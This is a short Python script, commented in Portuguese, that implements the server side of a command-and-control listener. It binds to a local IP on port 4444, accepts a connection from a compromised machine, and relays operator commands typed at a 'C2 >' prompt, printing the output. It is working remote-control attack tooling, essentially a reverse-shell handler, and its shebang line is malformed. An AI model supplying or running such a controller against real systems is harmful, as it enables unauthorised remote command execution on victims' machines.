#!/usr/bin/bash env
import socket
from termcolor import colored

def start_server(host, port):
    # Criar socket TCP
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen(5)
    
    print(colored(f"[-] Aguardando conexões em {host}:{port}...", "green"))
    target, ip = sock.accept()
    print(colored(f"[+] Conectado com: {ip}", "green"))

    # Loop de comunicação
    while True:
        command = input(colored("C2 > ", "blue"))
        
        if command.lower() in ["exit", "quit"]:
            target.send(b"exit")
            target.close()
            print(colored("[!] Conexão encerrada.", "red"))
            break

        if command.strip() == "":
            continue

        target.send(command.encode())
        result = target.recv(4096).decode(errors="ignore")
        print(colored(result, "yellow"))

if __name__ == "__main__":
    HOST = "192.168.15.6"  # IP do servidor C2
    PORT = 4444
    start_server(HOST, PORT)
